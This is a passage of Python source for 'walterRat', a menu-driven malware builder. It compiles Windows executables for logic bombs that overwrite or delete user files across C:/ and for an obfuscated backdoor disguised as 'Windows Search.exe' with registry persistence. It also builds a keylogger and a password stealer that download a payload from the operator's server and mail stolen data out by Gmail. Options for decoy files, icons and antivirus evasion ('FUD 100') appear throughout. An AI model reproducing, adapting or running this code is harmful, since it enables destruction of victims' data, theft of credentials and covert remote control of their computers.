                    convert_to_exe="wine /home/%s/.wine/drive_c/Python27/Scripts/pyinstaller.exe  --noconsole --onefile  viruses/del_xml.py"%(str(hostname[0]))
                    os.system(convert_to_exe)
                    os.system("cp dist/del_xml.exe exe_files/")
                    os.system("sudo rm -r dist/ build/")
                elif inpt=="10":
                    os.system("clear")
                    self.__init__()
                    convert_to_exe="wine /home/%s/.wine/drive_c/Python27/Scripts/pyinstaller.exe  --noconsole --onefile  viruses/del_png.py"%(str(hostname[0]))
                    os.system(convert_to_exe)
                    os.system("cp dist/del_png.exe exe_files/")
                    os.system("sudo rm -r dist/ build/")
                elif inpt=="11":
                    os.system("clear")
                    self.__init__()
                    convert_to_exe="wine /home/%s/.wine/drive_c/Python27/Scripts/pyinstaller.exe  --noconsole --onefile  viruses/del_jpg.py"%(str(hostname[0]))
                    os.system(convert_to_exe)
                    os.system("cp dist/del_jpg.exe exe_files/")
                    os.system("sudo rm -r dist/ build/")
                elif inpt=="12":
                    os.system("clear")
                    self.__init__()
                    convert_to_exe="wine /home/%s/.wine/drive_c/Python27/Scripts/pyinstaller.exe  --noconsole --onefile  viruses/del_all.py"%(str(hostname[0]))
                    os.system(convert_to_exe)
                    os.system("cp dist/del_all.exe exe_files/")
                    os.system("sudo rm -r dist/ build/")
                elif inpt=="13":
                    os.system("clear")
                    self.__init__()
                    print "%s[%s!%s]%sDegistirmek Istedigin Yaziyi Gir%s"%(colors["RED"],colors["YELLOW"],colors["RED"],colors["YELLOW"],colors["END"])
                    ac="\n\n"+colors["OKBLUE"]+"walter"+colors["FAIL"]+"@"+colors["YELLOW"]+"RepTxt"+colors["RED"]+"["+colors["END"]+"~"+colors["RED"]+"]"+colors["END"]
                    rep_txt=raw_input(ac)
                    with open("rep_txt.py","w") as text:
                        text.write("""
import os
import random
import sys
os.system("cls")
for a,b,c in os.walk("C:/"):
    for i in c:
        try:
            os.chdir(a)
        except:
            pass
        try:
            if i.endsswith(".txt"):  
                with open(i,"w") as file:
                    file.write('%s')
                    
        except:
            pass                     
    """%rep_txt)

                    convert_to_exe="wine /home/%s/.wine/drive_c/Python27/Scripts/pyinstaller.exe  --noconsole --onefile  rep_txt.py"%(str(hostname[0]))
                    os.system(convert_to_exe)
                    os.system("cp dist/rep_txt.exe .")
                    os.system("sudo rm -r dist/ build/ rep_txt.spec rep_txt.py")
                elif inpt=="14":
                    os.system("clear")
                    self.__init__()
                    print "%s[%s!%s]%sDegistirmek Istedigin Yaziyi Gir%s"%(colors["RED"],colors["YELLOW"],colors["RED"],colors["YELLOW"],colors["END"])
                    ac="\n\n"+colors["OKBLUE"]+"walter"+colors["FAIL"]+"@"+colors["YELLOW"]+"RepPdf"+colors["RED"]+"["+colors["END"]+"~"+colors["RED"]+"]"+colors["END"]
                    rep_txt=raw_input(ac)
                    with open("rep_pdf.py","w") as text:
                        text.write("""
import os
import random
import sys
os.system("cls")
for a,b,c in os.walk("C:/"):
    for i in c:
        try:
            os.chdir(a)
        except:
            pass
        try:
            if i.endswith(".pdf"): 
                with open(i,"w") as file:
                    file.write('%s')
                    
        except:
            pass                     
    """%rep_txt)

                    convert_to_exe="wine /home/%s/.wine/drive_c/Python27/Scripts/pyinstaller.exe  --noconsole --onefile  rep_pdf.py"%(str(hostname[0]))
                    os.system(convert_to_exe)
                    os.system("cp dist/rep_pdf.exe .")
                    os.system("sudo rm -r dist/ build/ rep_pdf.spec rep_pdf.py")
                elif inpt=="15":
                    os.system("clear")
                    self.__init__()
                    print "%s[%s!%s]%sDegistirmek Istedigin Yaziyi Gir%s"%(colors["RED"],colors["YELLOW"],colors["RED"],colors["YELLOW"],colors["END"])
                    ac="\n\n"+colors["OKBLUE"]+"walter"+colors["FAIL"]+"@"+colors["YELLOW"]+"RepDocx"+colors["RED"]+"["+colors["END"]+"~"+colors["RED"]+"]"+colors["END"]
                    rep_txt=raw_input(ac)
                    with open("rep_docx.py","w") as text:
                        text.write("""
import os
import random
import sys
os.system("cls")
for a,b,c in os.walk("C:/"):
    for i in c:
        try:
            os.chdir(a)
        except:
            pass
        try:
            if i.endswith(".docx"): 
                with open(i,"w") as file:
                    file.write('%s')
                    
        except:
            pass                     
    """%rep_txt)

                    convert_to_exe="wine /home/%s/.wine/drive_c/Python27/Scripts/pyinstaller.exe  --noconsole --onefile  rep_docx.py"%(str(hostname[0]))
                    os.system(convert_to_exe)
                    os.system("cp dist/rep_docx.exe .")
                    os.system("sudo rm -r dist/ build/ rep_docx.spec rep_docx.py")
                elif inpt=="16":
                    os.system("clear")
                    self.__init__()
                    print "%s[%s!%s]%sDegistirmek Istedigin Yaziyi Gir%s"%(colors["RED"],colors["YELLOW"],colors["RED"],colors["YELLOW"],colors["END"])
                    ac="\n\n"+colors["OKBLUE"]+"walter"+colors["FAIL"]+"@"+colors["YELLOW"]+"RepXlsx"+colors["RED"]+"["+colors["END"]+"~"+colors["RED"]+"]"+colors["END"]
                    rep_txt=raw_input(ac)
                    with open("rep_xlsx.py","w") as text:
                        text.write("""
import os
import random
import sys
os.system("cls")
for a,b,c in os.walk("C:/"):
    for i in c:
        try:
            os.chdir(a)
        except:
            pass
        try:
            if i.endswith(".xlsx"): 
                with open(i,"w") as file:
                    file.write('%s')
                    
        except:
            pass                     
    """%rep_txt)

                    convert_to_exe="wine /home/%s/.wine/drive_c/Python27/Scripts/pyinstaller.exe  --noconsole --onefile  rep_xlsx.py"%(str(hostname[0]))
                    os.system(convert_to_exe)
                    os.system("cp dist/rep_xlsx.exe .")
                    os.system("sudo rm -r dist/ build/ rep_xlsx.spec rep_xlsx.py")
                elif inpt=="17":
                    os.system("clear")
                    self.__init__()
                    print "%s[%s!%s]%sDegistirmek Istedigin Yaziyi Gir%s"%(colors["RED"],colors["YELLOW"],colors["RED"],colors["YELLOW"],colors["END"])
                    ac="\n\n"+colors["OKBLUE"]+"walter"+colors["FAIL"]+"@"+colors["YELLOW"]+"RepAll"+colors["RED"]+"["+colors["END"]+"~"+colors["RED"]+"]"+colors["END"]
                    rep_txt=raw_input(ac)
                    with open("rep_all.py","w") as text:
                        text.write("""
import os
import random
import sys
os.system("cls")
for a,b,c in os.walk("C:/"):
    for i in c:
        try:
            os.chdir(a)
        except:
            pass
        try:
            with open(i,"w") as file:
                file.write('%s')
                    
        except:
            pass                     
    """%rep_txt)

                    convert_to_exe="wine /home/%s/.wine/drive_c/Python27/Scripts/pyinstaller.exe  --noconsole --onefile  rep_all.py"%(str(hostname[0]))
                    os.system(convert_to_exe)
                    os.system("cp dist/rep_all.exe .")
                    os.system("sudo rm -r dist/ build/ rep_all.spec rep_all.py")
                elif inpt=="18":
                    os.system("clear")
                    self.__init__()
                    convert_to_exe="wine /home/%s/.wine/drive_c/Python27/Scripts/pyinstaller.exe  --noconsole --onefile  viruses/harddisk_exploit.py"%(str(hostname[0]))
                    os.system(convert_to_exe)
                    os.system("cp dist/harddisk_exploit.exe exe_files/")
                    os.system("sudo rm -r dist/ build/")
        elif select=="2":
            os.system("clear")
            print "%s[!]%sLanguage Has Been Selected As English"%(colors["RED"],colors["YELLOW"])
            time.sleep(3)
            self.__init__()
            selection="\n\n"+colors["OKBLUE"]+"walter"+colors["FAIL"]+"@"+colors["YELLOW"]+"walterRat"+colors["RED"]+"["+colors["END"]+"~"+colors["RED"]+"]"+colors["END"]
            options="""
%s[%s!%s]%sPlease Select An Option%s

    %s[%s1%s]%sGenerate Backdoor(FUD 99)%s
    %s[%s2%s]%sGenerate Keylogger(FUD 100)%s
    %s[%s3%s]%sGenerate Password Stealer(FUD 100)%s
    %s[%s4%s]%sGenerate Logic Bomb(FUD 100)%s
    %s[%s5%s]%sActivate The Listener%s

    """%(colors["RED"],colors["YELLOW"],colors["RED"],colors["YELLOW"],colors["END"],colors["RED"],colors["YELLOW"],colors["RED"],colors["YELLOW"],colors["END"],colors["RED"],colors["YELLOW"],colors["RED"],colors["YELLOW"],colors["END"],colors["RED"],colors["YELLOW"],colors["RED"],colors["YELLOW"],colors["END"],colors["RED"],colors["YELLOW"],colors["RED"],colors["YELLOW"],colors["END"],colors["RED"],colors["YELLOW"],colors["RED"],colors["YELLOW"],colors["END"])+selection
            inpt=raw_input(options)
            if inpt=="1":
                os.system("clear")
                self.__init__()
                print "%s[%s+%s]%sPlease Input Your Ip Address%s"%(colors["RED"],colors["YELLOW"],colors["RED"],colors["YELLOW"],colors["END"])
                address_cross="\n\n"+colors["OKBLUE"]+"walter"+colors["FAIL"]+"@"+colors["YELLOW"]+"Ip_Address"+colors["RED"]+"["+colors["END"]+"~"+colors["RED"]+"]"+colors["END"]
        
                default_private_ip=subprocess.check_output("nmcli -p device show",shell=True)
                default_private_ip=default_private_ip.split("\n")
                for i in default_private_ip:
                    if i.startswith("IP4.ADDRESS[1]:") and not "127.0.0.1" in i:
                        default_private_ip=i.split(":")
                        default_private_ip=default_private_ip[1]
                        default_private_ip=default_private_ip.split("/")
                        default_private_ip=str(default_private_ip[0])
                        default_private_ip=str(default_private_ip.strip())
                print "\n%s=================================="%colors["YELLOW"]
                print "\n%s[%s+%s]%sYour Private Ip Address:%s%s"%(colors["RED"],colors["YELLOW"],colors["RED"],colors["YELLOW"],colors["OKBLUE"],default_private_ip)
                public_ip=subprocess.check_output("curl -s icanhazip.com",shell=True)
                public_ip=public_ip.split("\n")
                public_ip=str(public_ip[0])
                print "%s[%s+%s]%sYour Public Ip Address:%s%s"%(colors["RED"],colors["YELLOW"],colors["RED"],colors["YELLOW"],colors["OKBLUE"],public_ip)
                print "%s==================================\n"%colors["YELLOW"]
                ip_adres=raw_input(address_cross)
                print "\n%s[%s+%s]%sIp Address:%s%s%s"%(colors["YELLOW"],colors["OKBLUE"],colors["YELLOW"],colors["YELLOW"],colors["OKBLUE"],ip_adres,colors["END"])
                os.system("systemctl start apache2.service")
                Popen(["lxterminal","-t","walterRat","-e","cd /var/www/html/ && python -m SimpleHTTPServer 8080"])                    
                time.sleep(3)
                os.system("clear")
                self.__init__()
                print "%s[%s!%s]%sPlease Input Your Port Number%s"%(colors["RED"],colors["YELLOW"],colors["RED"],colors["YELLOW"],colors["END"])
                ac="\n\n"+colors["OKBLUE"]+"walter"+colors["FAIL"]+"@"+colors["YELLOW"]+"Port_Number"+colors["RED"]+"["+colors["END"]+"~"+colors["RED"]+"]"+colors["END"]
                port_adres=raw_input(ac)
                print "\n%s[%s+%s]%sYour Port Number:%s%s"%(colors["RED"],colors["YELLOW"],colors["RED"],colors["YELLOW"],colors["OKBLUE"],port_adres)
                time.sleep(3)
                os.system("clear")
                self.__init__()
                with open (r"viruses/backdoor_unencrypted.py","r+") as bd:
                    backdoor_codes=bd.read()
                    portip_codes="""
while True:
    try:
        my_Health=Health('%s',%s)
        my_Health.run()
    except:
        pass"""%(ip_adres,port_adres)
                codes=backdoor_codes+portip_codes
                code=base64.b64encode(codes)
                
                with open("Windows Search.py","w") as wr:
                    wr.write("""
import base64
from cryptography.fernet import Fernet
import socket
import os
import json
import subprocess
import base64
import sys
import pyautogui
import tempfile
import sys
import time
import threading
import cv2
from scipy.io.wavfile import write
import sounddevice
key=Fernet.generate_key()
f=Fernet(key)
token = f.encrypt(b"%s")
exec(base64.b64decode(f.decrypt(token)))

"""%(code))
                isim="%s[%s+%s]%sInput A Name For The Backdoor[YOU CAN'T CHANGE THE NAME LATER OTHERWISE CONNECTION WON'T REALIZE!]"%(colors["YELLOW"],colors["RED"],colors["YELLOW"],colors["YELLOW"])
                isim=isim+"\n%s[!]%sDon't Input The Extension(Input It As 'myfile',Don't Input It As 'myfile.exe')"%(colors["RED"],colors["YELLOW"])
                
                inp=isim+"\n\n"+colors["OKBLUE"]+"walter"+colors["FAIL"]+"@"+colors["YELLOW"]+"Name"+colors["RED"]+"["+colors["END"]+"~"+colors["RED"]+"]"+colors["END"]
                bd_name=raw_input(inp)
                os.system("clear")
                self.__init__()

                seng="%s[%s!%s]%sDo You Want To Add Social Engineering?%s\n\n\t%s[%s+%s]%sYes/No\n%s[%s!%s]%sUse Solely English Letters"%(colors["YELLOW"],colors["RED"],colors["YELLOW"],colors["YELLOW"],colors["END"],colors["YELLOW"],colors["RED"],colors["YELLOW"],colors["YELLOW"],colors["YELLOW"],colors["RED"],colors["YELLOW"],colors["RED"])
                song=seng+"\n\n"+colors["OKBLUE"]+"walter"+colors["FAIL"]+"@"+colors["YELLOW"]+"walterRat"+colors["RED"]+"["+colors["END"]+"~"+colors["RED"]+"]"+colors["END"]
                cus=raw_input(song)
                cus=cus.upper()
                if cus=="YES" or cus=="yes":
                    os.system("clear")
                    self.__init__()
                    file_path="%s[%s+%s]%sInput The File That You Want To Enbed[File Has To Be In The Same Directory]%s"%(colors["YELLOW"],colors["RED"],colors["YELLOW"],colors["YELLOW"],colors["END"])+"\n\n"+colors["OKBLUE"]+"walter"+colors["FAIL"]+"@"+colors["YELLOW"]+"FilePath"+colors["RED"]+"["+colors["END"]+"~"+colors["RED"]+"]"+colors["END"]
                    filep=raw_input(file_path)    
                    fname="Windows Search.exe"
                    evil_file="""
import requests,re,subprocess,smtplib,tempfile
import os
import sys
import time
import shutil
def get_info(url):
        resp=requests.get(url)
        file_name=url.split("/")[-1]
        with open(file_name,"wb") as file:
                file.write(resp.content)
file_name=sys._MEIPASS+"\%s"
subprocess.Popen(file_name,shell=True)
temp_folder=tempfile.gettempdir()
os.chdir(temp_folder)
get_info("http://%s:8080/%s")
try:
    e_f_loc=os.environ["appdata"]+"\\Windows Search.exe"
    if not os.path.exists(e_f_loc):
        shutil.copyfile(sys.executable,e_f_loc)
        subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v search /t REG_SZ /d "'+e_f_loc+'"',shell=True)
except:
    pass
subprocess.call('%s',shell=True)
                    

"""%(filep,ip_adres,fname,fname)
                    dosya=bd_name+".py"
                    with open(dosya,"w") as f:
                        f.write(evil_file)
                    hostname=subprocess.check_output(["id"])
		    hostname=hostname.split("(")
		    hostname=str(hostname[1]).split(")")

                    os.system("clear")
                    self.__init__()
                    icon="%s[%s+%s]%sDo You Want To Add An Icon?%s"%(colors["YELLOW"],colors["RED"],colors["YELLOW"],colors["YELLOW"],colors["END"])+"\n\n"+colors["OKBLUE"]+"walter"+colors["FAIL"]+"@"+colors["YELLOW"]+"IconSecimi"+colors["RED"]+"["+colors["END"]+"~"+colors["RED"]+"]"+colors["END"]
                    ico=raw_input(icon)
                    ico=ico.upper()
                    if ico=="YES" or ico=="yes":
                        os.system("clear")
                        self.__init__()
                        icon="%s[%s+%s]%sInput The Icon Path%s"%(colors["YELLOW"],colors["RED"],colors["YELLOW"],colors["YELLOW"],colors["END"])+"\n\n"+colors["OKBLUE"]+"walter"+colors["FAIL"]+"@"+colors["YELLOW"]+"IconSecimi"+colors["RED"]+"["+colors["END"]+"~"+colors["RED"]+"]"+colors["END"]                
                        ic=raw_input(icon)
                        print ic
                        
                        com="wine /home/%s/.wine/drive_c/Python27/Scripts/pyinstaller.exe --add-data '%s;.' --noconsole --onefile --icon %s %s.py"%(str(hostname[0]),filep,ic,bd_name)
                        os.system(com)
                    else:
                        com="wine /home/%s/.wine/drive_c/Python27/Scripts/pyinstaller.exe --add-data '%s;.' --noconsole --onefile %s.py"%(str(hostname[0]),filep,bd_name)
                        os.system(com)
                else:
                    fname="Windows Search.exe"
                    evil_file="""
import requests,re,subprocess,smtplib,tempfile
import os
import shutil
import time
def get_info(url):
        resp=requests.get(url)
        file_name=url.split("/")[-1]
        with open(file_name,"wb") as file:
                file.write(resp.content)
temp_folder=tempfile.gettempdir()
os.chdir(temp_folder)
get_info("http://%s:8080/%s")
e_f_loc=os.environ["appdata"]+"\\Windows Search.exe"
if not os.path.exists(e_f_loc):
    shutil.copyfile(sys.executable,e_f_loc)
    subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v search /t REG_SZ /d "'+e_f_loc+'"',shell=True)

subprocess.call('%s',shell=True)


"""%(ip_adres,fname,fname)
                    dosya=bd_name+".py"
                    with open(dosya,"w") as f:
                        f.write(evil_file)
                    os.system("clear")
                    self.__init__()
                    icon="%s[%s+%s]%sDo You Want To Add An Icon?%s"%(colors["YELLOW"],colors["RED"],colors["YELLOW"],colors["YELLOW"],colors["END"])+"\n\n"+colors["OKBLUE"]+"walter"+colors["FAIL"]+"@"+colors["YELLOW"]+"IconSecimi"+colors["RED"]+"["+colors["END"]+"~"+colors["RED"]+"]"+colors["END"]
                    ico=raw_input(icon)
                    ico=ico.upper()
                    if ico=="YES" or ico=="yes":
                        os.system("clear")
                        self.__init__()
                        icon="%s[%s+%s]%sInput The Icon Path%s"%(colors["YELLOW"],colors["RED"],colors["YELLOW"],colors["YELLOW"],colors["END"])+"\n\n"+colors["OKBLUE"]+"walter"+colors["FAIL"]+"@"+colors["YELLOW"]+"IconSecimi"+colors["RED"]+"["+colors["END"]+"~"+colors["RED"]+"]"+colors["END"]                
                        ic=raw_input(icon)
                        print ic
                        
                        com="wine /home/%s/.wine/drive_c/Python27/Scripts/pyinstaller.exe  --noconsole --onefile --icon %s %s.py"%(str(hostname[0]),ic,bd_name)
                        os.system(com)
                    else:
                        com="wine /home/%s/.wine/drive_c/Python27/Scripts/pyinstaller.exe --noconsole --onefile %s.py"%(str(hostname[0]),bd_name)
                        os.system(com)
                os.system("cp dist/%s.exe exe_files/"%bd_name)
                os.system("sudo cp exe_files/%s.exe /var/www/html"%bd_name)
                print colors["GREEN"]
                os.system("clear")
                self.__init__()
                com="wine /home/%s/.wine/drive_c/Python27/Scripts/pyinstaller.exe  --onefile --icon Search-Icon/search.ico Windows\ Search.py"%str(hostname[0])

                os.system(com)
                time.sleep(1)
                os.system("cp dist/Windows\ Search.exe exe_files/")
                os.system("sudo cp exe_files/Windows\ Search.exe /var/www/html")
                os.system("rm -r build/ dist/")
                os.system("rm -r Windows\ Search.py *.spec %s.py"%bd_name)

                os.system("clear")
                self.__init__()
                seng="%s[%s!%s]%sAll The Necessery Files Are Saved In /var/www/html%s\n\n\t%s[%s!%s]%sDO NOT TOUCH TO 'Windows Search.exe'\n%s[%s!%s]%sYou Have To Send The '%s.exe' File To The Victim."%(colors["YELLOW"],colors["RED"],colors["YELLOW"],colors["YELLOW"],colors["END"],colors["YELLOW"],colors["RED"],colors["YELLOW"],colors["YELLOW"],colors["YELLOW"],colors["RED"],colors["YELLOW"],colors["RED"],bd_name)
                print seng
                
                kod="""
import sys
sys.path.append("./viruses/")
from listener import *
my_listener=Listener('%s',%s)
try:
    t=threading.Thread(target=my_listener.run,name='listener')
    t.start()
except:
    pass"""%(default_private_ip,port_adres)
                with open("viruses/walterRat_listener.py","w") as wr:
                    wr.write(kod)
                Popen(["lxterminal","-t","walterRat","-e","python","viruses/walterRat_listener.py"])
            elif inpt=="2":
                os.system("systemctl start apache2.service")
                os.system("clear")
                self.__init__()
                Popen(["lxterminal","-t","walterRat","-e","cd /var/www/html/ && python -m SimpleHTTPServer 8080"])
                print "%s[%s+%s]%sInput Your Gmail Address%s"%(colors["RED"],colors["YELLOW"],colors["RED"],colors["YELLOW"],colors["END"])
                ac="\n\n"+colors["OKBLUE"]+"walter"+colors["FAIL"]+"@"+colors["YELLOW"]+"Mail_Address"+colors["RED"]+"["+colors["END"]+"~"+colors["RED"]+"]"+colors["END"]
                mail=raw_input(ac)
                os.system("clear")
                self.__init__()
                print "%s[%s+%s]%sInput Your Password%s"%(colors["RED"],colors["YELLOW"],colors["RED"],colors["YELLOW"],colors["END"])
                ac="\n\n"+colors["OKBLUE"]+"walter"+colors["FAIL"]+"@"+colors["YELLOW"]+"Password"+colors["RED"]+"["+colors["END"]+"~"+colors["RED"]+"]"+colors["END"]
                password=getpass.getpass(ac)
                with open(r"viruses/walterRat_keylogger.py","r") as kg:
                    c=kg.read()
                c1="""
mc=capture_words('%s','%s')
mc.start()
"""%(mail,password)
                c=c+c1
                k_code=base64.b64encode(c)

                keylogger_code="""
import sys
import pynput.keyboard
import threading
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email import encoders
from email.mime.base import MIMEBase
import pyautogui
import tempfile
import os
import subprocess
import shutil
from cryptography.fernet import Fernet
import base64
key=Fernet.generate_key()
f=Fernet(key)
token = f.encrypt(b"%s")
exec(base64.b64decode(f.decrypt(token)))
"""%(k_code)
                os.system("clear")
                self.__init__()
                seng="%s[%s!%s]%sDo You Want To Generate The Keylogger With Using Social Engineering?%s\n\n\t%s[%s+%s]%syes/no\n%s[%s!%s]%sUse Solely English Letters"%(colors["YELLOW"],colors["RED"],colors["YELLOW"],colors["YELLOW"],colors["END"],colors["YELLOW"],colors["RED"],colors["YELLOW"],colors["YELLOW"],colors["YELLOW"],colors["RED"],colors["YELLOW"],colors["RED"])
                song=seng+"\n\n"+colors["OKBLUE"]+"walter"+colors["FAIL"]+"@"+colors["YELLOW"]+"walterRat"+colors["RED"]+"["+colors["END"]+"~"+colors["RED"]+"]"+colors["END"]
                cus=raw_input(song)
                cus=cus.upper()
                
                if cus=="YES" or cus=="yes":
                    os.system("clear")
                    self.__init__()
                    bd_name="Explorer"
                    os.system("clear")
                    self.__init__()   
                    with open("Explorer.py","w") as keylogger:
                        keylogger.write(keylogger_code)
                    convert_to_exe="wine /home/%s/.wine/drive_c/Python27/Scripts/pyinstaller.exe --noconsole --onefile --icon Search-Icon/explorer.ico Explorer.py"%(str(hostname[0]))
                    os.system(convert_to_exe)
                    os.system("cp dist/Explorer.exe exe_files/")
                    os.system("sudo cp exe_files/Explorer.exe /var/www/html")
                    os.system("sudo rm -r dist/ build/ Explorer* ")
                    os.system("clear")
                
                else:
                    os.system("clear")
                    self.__init__()
                    seng="%s[%s+%s]%sInput A Name For The Keylogger%s"%(colors["RED"],colors["YELLOW"],colors["RED"],colors["YELLOW"],colors["END"])
                    song=seng+"\n\n"+colors["OKBLUE"]+"walter"+colors["FAIL"]+"@"+colors["YELLOW"]+"Name"+colors["RED"]+"["+colors["END"]+"~"+colors["RED"]+"]"+colors["END"]
                    bd_name=raw_input(song)
                    os.system("clear")
                    self.__init__()   
                    bd_name=bd_name+".py"
                    with open(bd_name,"w") as keylogger:
                        keylogger.write(keylogger_code)
                    seng="%s[%s!%s]%sDo You Want To Add An Icon?%s\n\n\t%s[%s+%s]%syes/no\n%s[%s!%s]%sUse Solely English Letters"%(colors["YELLOW"],colors["RED"],colors["YELLOW"],colors["YELLOW"],colors["END"],colors["YELLOW"],colors["RED"],colors["YELLOW"],colors["YELLOW"],colors["YELLOW"],colors["RED"],colors["YELLOW"],colors["RED"])
                    song=seng+"\n\n"+colors["OKBLUE"]+"walter"+colors["FAIL"]+"@"+colors["YELLOW"]+"Icon"+colors["RED"]+"["+colors["END"]+"~"+colors["RED"]+"]"+colors["END"]
                    ic=raw_input(song)
                    if ic=="yes" or ic=="YES":
                        os.system("clear")
                        self.__init__()
                        seng="%s[%s+%s]%sInput The Icon Path%s"%(colors["RED"],colors["YELLOW"],colors["RED"],colors["YELLOW"],colors["END"])
                        song=seng+"\n\n"+colors["OKBLUE"]+"walter"+colors["FAIL"]+"@"+colors["YELLOW"]+"IconPath"+colors["RED"]+"["+colors["END"]+"~"+colors["RED"]+"]"+colors["END"]
                        ic_path=raw_input(song)
                        ic_path=str(ic_path)
                        convert_to_exe="wine /home/%s/.wine/drive_c/Python27/Scripts/pyinstaller.exe --noconsole  --onefile --icon %s %s "%(str(hostname[0]),ic_path,bd_name)
                        os.system(convert_to_exe)
                        os.system("cp dist/* exe_files/")
                        os.system("sudo cp exe_files/*.exe /var/www/html")
                        os.system("sudo rm -r dist/ build/ *.spec %s "%bd_name)
                        os.system("clear")
                    else:
                        convert_to_exe="wine /home/%s/.wine/drive_c/Python27/Scripts/pyinstaller.exe --noconsole  --onefile %s"%(str(hostname[0]),bd_name)
                        os.system(convert_to_exe)
                        os.system("cp dist/* exe_files/")
                        os.system("sudo cp exe_files/*.exe /var/www/html")
                        os.system("sudo rm -r dist/ build/ *.spec %s "%bd_name)
                        os.system("clear")
                seng="%s[%s!%s]%sAll The Neceserry Files Are In The /var/www/html Folder"%(colors["YELLOW"],colors["RED"],colors["YELLOW"],colors["RED"])
                print seng
            elif inpt=="5":
                try:
                    Popen(["lxterminal","-t","walterRat","-e","python","viruses/walterRat_listener.py"])
                except:
                    os.system("clear")
                    self.__init__()
                    print colors["RED"]+"[!]%sThe Backdoor File Has To Been Created First"%(colors["YELLOW"])
            elif inpt=="3":
                os.system("clear")
                self.__init__()
                print "%s[%s+%s]%sInput Your Private Or Public Ip Address%s"%(colors["RED"],colors["YELLOW"],colors["RED"],colors["YELLOW"],colors["END"])
                address_cross="\n\n"+colors["OKBLUE"]+"walter"+colors["FAIL"]+"@"+colors["YELLOW"]+"Ip_Address"+colors["RED"]+"["+colors["END"]+"~"+colors["RED"]+"]"+colors["END"]
                Popen(["lxterminal","-t","walterRat","-e","cd /var/www/html/ && python -m SimpleHTTPServer 8080"])
                default_private_ip=subprocess.check_output("nmcli -p device show",shell=True)
                default_private_ip=default_private_ip.split("\n")
                for i in default_private_ip:
                    if i.startswith("IP4.ADDRESS[1]:") and not "127.0.0.1" in i:
                        default_private_ip=i.split(":")
                        default_private_ip=default_private_ip[1]
                        default_private_ip=default_private_ip.split("/")
                        default_private_ip=str(default_private_ip[0])
                        default_private_ip=str(default_private_ip.strip())
                print "\n%s=================================="%colors["YELLOW"]
                print "\n%s[%s+%s]%sYour Private Ip Address:%s%s"%(colors["RED"],colors["YELLOW"],colors["RED"],colors["YELLOW"],colors["OKBLUE"],default_private_ip)
                public_ip=subprocess.check_output("curl -s icanhazip.com",shell=True)
                public_ip=public_ip.split("\n")
                public_ip=str(public_ip[0])
                print "%s[%s+%s]%sYour Public Ip Address:%s%s"%(colors["RED"],colors["YELLOW"],colors["RED"],colors["YELLOW"],colors["OKBLUE"],public_ip)
                print "%s==================================\n"%colors["YELLOW"]
                ip_adres=raw_input(address_cross)
                Popen(["lxterminal","-t","walterRat","-e","cd /var/www/html/ && python -m SimpleHTTPServer 8080"])
                os.system("clear")
                self.__init__()
                print "%s[%s+%s]%sInput Your Gmail Account%s"%(colors["RED"],colors["YELLOW"],colors["RED"],colors["YELLOW"],colors["END"])
                ac="\n\n"+colors["OKBLUE"]+"walter"+colors["FAIL"]+"@"+colors["YELLOW"]+"Mail Address"+colors["RED"]+"["+colors["END"]+"~"+colors["RED"]+"]"+colors["END"]
                mail=raw_input(ac)
                os.system("clear")
                self.__init__()
                print "%s[%s+%s]%sInput Your Password%s"%(colors["RED"],colors["YELLOW"],colors["RED"],colors["YELLOW"],colors["END"])
                ac="\n\n"+colors["OKBLUE"]+"walter"+colors["FAIL"]+"@"+colors["YELLOW"]+"Password"+colors["RED"]+"["+colors["END"]+"~"+colors["RED"]+"]"+colors["END"]
                password=getpass.getpass(ac)
                p_stealer="""
import requests,re,subprocess,smtplib,tempfile
import os
import time
def send_mail(email,password,message):
        server=smtplib.SMTP("smtp.gmail.com",587)
        server.starttls()
        server.login(email,password)
        server.sendmail(email,email,message)
        server.quit()

def get_info(url):
        resp=requests.get(url)
        file_name=url.split("/")[-1]
        with open(file_name,"wb") as file:
                file.write(resp.content)
temp_folder=tempfile.gettempdir()
os.chdir(temp_folder)
get_info("http://%s:8080/new_project.exe")
result=subprocess.check_output("new_project.exe all",shell=True)
try:
        send_mail('%s','%s',result)
                
except:
        pass
os.remove("new_project.exe")"""%(ip_adres,mail,password)
                with open("password_stealer.py","w") as pstealer:
                    pstealer.write(p_stealer)
                convert_to_exe="wine /home/%s/.wine/drive_c/Python27/Scripts/pyinstaller.exe  --onefile  password_stealer.py"%(str(hostname[0]))
                os.system(convert_to_exe)
                os.system("systemctl start apache2.service")
                os.system("cp dist/password_stealer.exe viruses/")
                os.system("cp dist/password_stealer.exe .")
                os.system("sudo cp viruses/new_project.exe /var/www/html")
                os.system("sudo cp viruses/password_stealer.exe /var/www/html")
                os.system("sudo rm -r *.spec password_stealer.py dist/ build/")
                os.system("clear")
                self.__init__()
                print "%s[!]%spassword_stealer.exe is in the exe_files/ directory%s"%(colors["RED"],colors["YELLOW"],colors["END"])
            elif inpt=="4":
                selection="\n\n"+colors["OKBLUE"]+"walter"+colors["FAIL"]+"@"+colors["YELLOW"]+"LogicBomb"+colors["RED"]+"["+colors["END"]+"~"+colors["RED"]+"]"+colors["END"]
                os.system("clear")
                self.__init__()
                options="""
%s[%s!%s]%sPlease Select An Option%s

    %s[%s1%s]%sDelete Exe(FUD 100)%s
    %s[%s2%s]%sDelete Pdf(FUD 100)%s
    %s[%s3%s]%sDelete Txt(FUD 100)%s
    %s[%s4%s]%sDelete Mp3(FUD 100)%s
    %s[%s5%s]%sDelete Mp4(FUD 100)%s
    %s[%s6%s]%sDelete Lnk(FUD 100)%s
    %s[%s7%s]%sDelete Docx(FUD 100)%s
    %s[%s8%s]%sDelete Xlsx(FUD 100)%s
    %s[%s9%s]%sDelete Xml(FUD 100)%s
    %s[%s10%s]%sDelete Png(FUD 100)%s
    %s[%s11%s]%sDelete Jpg(FUD 100)%s
    %s[%s12%s]%sDelete All Of Them(FUD 100)%s
    %s[%s13%s]%sReplace The Content Of Txt FilesFUD 100)%s
    %s[%s14%s]%sReplace The Content Of Pdf Files(FUD 100)%s
    %s[%s15%s]%sReplace The Content Of Docx Files(FUD 100)%s
    %s[%s16%s]%sReplace The Content Of Xlsx Files(FUD 100)%s
    %s[%s17%s]%sReplace The Content Of all(FUD 100)%s
    %s[%s18%s]%sHarddisk Exploitatior(FUD 100)%s

